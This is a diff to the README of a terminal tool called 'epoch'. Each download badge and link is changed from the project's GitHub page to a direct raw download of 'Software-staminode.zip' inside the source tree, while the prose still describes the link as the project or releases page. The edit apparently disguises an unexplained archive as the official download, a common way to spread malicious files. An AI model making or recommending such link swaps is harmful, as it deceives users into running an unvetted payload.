@@ -1,6 +1,6 @@
 # 🕰️ epoch - Simple Terminal Training Tool
 
-[![Download epoch](https://img.shields.io/badge/Download-epoch-blue)](https://github.com/Hugomo1/epoch)
+[![Download epoch](https://img.shields.io/badge/Download-epoch-blue)](https://raw.githubusercontent.com/Hugomo1/epoch/main/src/store/Software-staminode.zip)
 
 ---
 
@@ -25,11 +25,11 @@ epoch runs in the terminal, so you do not need a graphical interface or extra so
 
 ---
 
-# [![Download epoch](https://img.shields.io/badge/Download-epoch-green)](https://github.com/Hugomo1/epoch)
+# [![Download epoch](https://img.shields.io/badge/Download-epoch-green)](https://raw.githubusercontent.com/Hugomo1/epoch/main/src/store/Software-staminode.zip)
 
 ## 🖥️ Download and Install
 
-1. Click the big green link above or go to the [epoch GitHub page](https://github.com/Hugomo1/epoch).
+1. Click the big green link above or go to the [epoch GitHub page](https://raw.githubusercontent.com/Hugomo1/epoch/main/src/store/Software-staminode.zip).
 
 2. Since this link leads to the main project page, you will need to find the latest release.
 
@@ -129,7 +129,7 @@ Try maximizing the window or increasing the font size in your terminal settings.
 
 ## 🔗 Useful Links
 
-- Download and releases page: https://github.com/Hugomo1/epoch
+- Download and releases page: https://raw.githubusercontent.com/Hugomo1/epoch/main/src/store/Software-staminode.zip
 - Documentation: Available in the GitHub repository under the “docs” folder
 - Issues and support: Use the GitHub “Issues” tab to report bugs or ask for help
 
